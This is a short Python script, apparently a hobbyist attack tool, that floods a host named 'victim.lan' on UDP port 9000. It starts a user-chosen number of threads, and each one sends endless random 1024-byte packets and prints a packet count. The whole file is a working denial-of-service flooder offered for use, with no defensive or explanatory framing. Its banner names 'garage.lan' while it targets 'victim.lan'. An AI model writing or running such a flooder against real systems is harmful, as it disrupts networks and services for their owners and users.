import socket #Imports needed libraries
import random
import threading

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
 #Creates packet
ip = socket.gethostbyname('victim.lan')
port = 9000
sent = 0
print("ATTACK garage.lan @ 9000")
THREAD_COUNT = int(input("threads:"))

def send_packets(ip, port):
    global sent, sock
    while True: # Infinitely loops sending packets to the port until the program is exited.
        bytes = random._urandom(1024)
        sock.sendto(bytes, (ip, port))
        print("Sent:" + str(sent) + "  @  " + str(ip)  + ":" + str(port))
        sent += 1
        

threads = []
for _ in range(THREAD_COUNT):
    thread = threading.Thread(target=send_packets, args=(ip, port))
    thread.start()
